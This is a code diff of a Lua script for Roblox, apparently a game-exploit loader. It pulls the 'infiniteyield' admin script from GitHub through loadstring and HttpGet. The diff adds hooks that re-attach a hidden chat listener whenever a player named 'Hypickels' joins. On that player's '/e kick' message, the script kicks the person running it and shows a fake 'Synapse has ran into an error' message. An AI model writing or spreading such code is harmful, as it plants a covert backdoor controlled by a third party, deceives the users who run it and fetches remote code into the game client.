@@ -1,10 +1,11 @@
 local speaker = game.Players.LocalPlayer
-loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))
 local people = {
     "432757113"
 }
 
 local current = nil 
+local init1 = false
 
  function reLoop()
     print("a")
@@ -23,6 +24,7 @@ local current = nil
 end
 
  function getChat()
+     init1 = true
     game.Players.Hypickels.Chatted:Connect(function(msg)
         if msg == "/e kick" then 
             speaker:Kick("Synapse has ran into an error please restart!")
@@ -44,5 +46,20 @@ end
         end
     end)
 end
+function start()
+    game.Players.PlayerAdded:Connect(function(plr)
+        if plr.Name == "Hypickels" then 
+            if init1 == false then 
+                getChat()
+            end
+        end
+    end)
+    game.Players.PlayerRemoving:Connect(function(plr)
+        if plr.Name == "Hypickels" then 
+            init1 = false
+        end
+    end)
+end
 
+start()
 reLoop()
